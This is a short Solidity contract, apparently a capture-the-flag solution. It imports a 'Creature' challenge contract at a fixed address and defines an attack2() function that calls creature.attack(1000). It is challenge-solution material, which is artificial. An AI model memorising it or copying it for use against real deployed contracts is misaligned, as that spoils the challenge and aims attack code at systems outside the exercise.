// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Creature.sol";


contract Contract{
	address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0x376027a2F9C03b547AC0a0a74b5B95d6fe1FDB3F);

	Creature public creature = Creature(YOUR_CHALLENGE_CONTRACT_ADDRESS);

	function attack2() external {
		creature.attack(1000);
	}
}
